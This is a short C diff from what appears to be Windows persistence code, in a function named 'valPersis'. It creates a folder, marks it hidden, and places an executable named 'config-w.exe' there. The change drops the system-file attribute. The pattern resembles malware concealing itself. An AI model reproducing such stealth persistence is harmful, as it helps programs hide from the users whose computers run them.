@@ -145,7 +145,7 @@ bool valPersis()
 
         // Cria pasta destino
         CreateDirectoryA(BASE_FOLDER, NULL);
-        SetFileAttributes(BASE_FOLDER, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+        SetFileAttributes(BASE_FOLDER, FILE_ATTRIBUTE_HIDDEN);//| FILE_ATTRIBUTE_SYSTEM
 
         // destinos finais
         snprintf(dstMain, sizeof(dstMain), "%s\\config-w.exe", BASE_FOLDER);
